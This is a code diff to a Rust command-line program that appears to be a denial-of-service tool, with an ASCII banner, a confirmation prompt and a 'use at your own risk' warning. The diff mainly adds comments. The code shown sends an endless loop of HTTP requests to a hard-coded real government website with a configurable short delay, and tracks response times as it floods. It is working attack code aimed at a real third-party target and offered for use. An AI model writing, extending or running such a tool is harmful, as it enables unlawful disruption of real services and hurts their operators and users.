@@ -17,18 +17,18 @@ const RESET: &str = "\x1b[0m";
 const BG_RED: &str = "\x1b[41m";
 const BG_MAGENTA: &str = "\x1b[45m";
 
+// this function print a message but after 100ms
 fn print_wait(text: &str) {
     std::thread::sleep(std::time::Duration::from_millis(100));
-
     println!("{}", text);
 }
 
 fn main() {
-    let mut confirm = true;
-    let mut delay = 20;
-    let mut command = "ddos";
-    let mut args: Vec<String> = std::env::args().collect();
-    args.remove(0);
+    let mut confirm = true; // if the program should ask for confirmation before running
+    let mut delay = 20; // delay between each request
+    let mut command = "ddos"; // command to run (ddos, version, help)
+    let mut args: Vec<String> = std::env::args().collect(); // arguments vector
+    args.remove(0); // remove the program name from the vector
 
     while args.len() > 0 {
         match args[0].as_str() {
@@ -47,6 +47,7 @@ fn main() {
             "--delay" | "-d" => {
                 if args.len() > 1 {
                     delay = match args[1].parse::<u64>() {
+                        // try to parse argument as a u64
                         Ok(n) => n,
                         Err(_) => {
                             println!(
@@ -79,8 +80,8 @@ fn main() {
 
     match command {
         "ddos" => {
-            print!("\x1B[2J\x1B[1;1H");
-            print!("\x1b[38;5;69m");
+            print!("\x1B[2J\x1B[1;1H"); // clear the screen and move the cursor to the top left
+            print!("\x1b[38;5;69m"); // set color to blue
             print!("\n\n");
             print_wait("  ██░ ██ ▓█████  ██▓     ██▓███                                  ");
             print_wait("  ▓██░ ██▒▓█   ▀ ▓██▒    ▓██░  ██▒                               ");
@@ -90,7 +91,7 @@ fn main() {
             print_wait("   ▒ ░░▒░▒░░ ▒░ ░░ ▒░▓  ░▒▓▒░ ░  ░                               ");
             print_wait("   ▒ ░▒░ ░ ░ ░  ░░ ░ ▒  ░░▒ ░    ░                               ");
             print_wait("   ░  ░░ ░   ░     ░ ░   ░░      ░                               ");
-            print!("\x1b[38;5;220m");
+            print!("\x1b[38;5;220m"); // set color to yellow
             print_wait("   █  ░ ██  ██ ▄█▀ ██▀███   ▄▄▄      ██▓ ███▄    █ ▓█████        ");
             print_wait("   ██  ▓██▒ ██▄█▒ ▓██ ▒ ██▒▒████▄    ▓██▒ ██ ▀█   █ ▓█   ▀       ");
             print_wait("  ▓██  ▒██░▓███▄░ ▓██ ░▄█ ▒▒██  ▀█▄  ▒██▒▓██  ▀█ ██▒▒███         ");
@@ -105,6 +106,7 @@ fn main() {
             print_wait("[ WARNING ] : USE AT YOUR OWN RISK.");
 
             if confirm {
+                // ask for confirmation
                 let mut input = String::new();
                 print!("\nEnter 'yes' to continue: ");
                 std::io::stdout().flush().expect("Couldn't flush stdout");
@@ -115,23 +117,23 @@ fn main() {
                 }
             }
             println!("\n{}[ i ] : Starting...\n", GREEN);
-            let url = String::from("http://government.ru");
+            let url = String::from("http://government.ru"); // url to send requests to
 
-            let mut req_count = 0;
+            let mut req_count = 0; // number of requests already sents
 
             let client = reqwest::blocking::Client::new();
 
             let mut cursor = TerminalCursor::new();
 
-            let mut res_time_vec: Vec<u128> = Vec::new();
-            let mut res_time: u128 = 0;
-            let mut average_ping: u128 = 0;
+            let mut res_time_vec: Vec<u128> = Vec::new(); // vector of all response times to create an average
+            let mut res_time: u128 = 0; // response time of the last request
+            let mut average_ping: u128 = 0; // average ping
 
             println!("{}{}", YELLOW, url);
-            let _ = cursor.hide();
+            let _ = cursor.hide(); // hide the cursor
             loop {
-                std::thread::sleep(std::time::Duration::from_millis(delay));
-                let start = SystemTime::now();
+                std::thread::sleep(std::time::Duration::from_millis(delay)); // wait delay between requests
+                let start = SystemTime::now(); // start time of the request
                 req_count += 1;
                 // Extra spaces to remove the chars left from the previous request
                 println!(
@@ -151,6 +153,7 @@ fn main() {
                     }
                 );
                 match client.get(&url).send() {
+                    // send request
                     Ok(res) => {
                         println!(
                             "{}[ i ] : Response: {} - Ping: {}ms        ",
@@ -163,10 +166,11 @@ fn main() {
                         println!("{}[ x ] : Request failed               ", RED);
                     }
                 }
-                let _ = cursor.move_up(2);
-                res_time = start.elapsed().unwrap().as_millis();
-                res_time_vec.push(res_time);
+                let _ = cursor.move_up(2); // move the cursor up 2 lines
+                res_time = start.elapsed().unwrap().as_millis(); // time elapsed since the request started
+                res_time_vec.push(res_time); // add the response time to the vector
                 average_ping = res_time_vec.iter().sum::<u128>() / res_time_vec.len() as u128;
+                // calculate the average ping
             }
         }
         "help" => {
